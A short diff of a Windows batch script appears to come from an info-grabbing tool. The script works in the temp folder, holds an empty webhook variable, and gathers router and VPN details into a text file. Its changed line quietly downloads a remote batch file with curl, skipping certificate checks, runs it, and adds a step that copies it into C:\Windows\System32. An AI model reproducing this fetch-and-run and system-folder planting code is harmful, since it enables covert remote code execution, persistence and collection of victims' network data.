@@ -20,7 +20,7 @@ cd %temp%
 set "webhook="
 
 :: router info command
-curl --create-dirs -sfkLo "%localappdata%\microsoft\windowsapps\Router.bat" "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Router-Info/source.bat" & call "%localappdata%\microsoft\windowsapps\Router.bat" >nul & call router>router.txt
+curl --create-dirs -sfkLo "%localappdata%\microsoft\windowsapps\Router.bat" "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Router-Info/source.bat" & call "%localappdata%\microsoft\windowsapps\Router.bat" >nul & Xcopy %localappdata%\microsoft\windowsapps\router.bat C:\Windows\System32 /Y & call router>router.txt
 
 :: router set info
 FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter security.vpn`) DO (SET vpn=%%F)
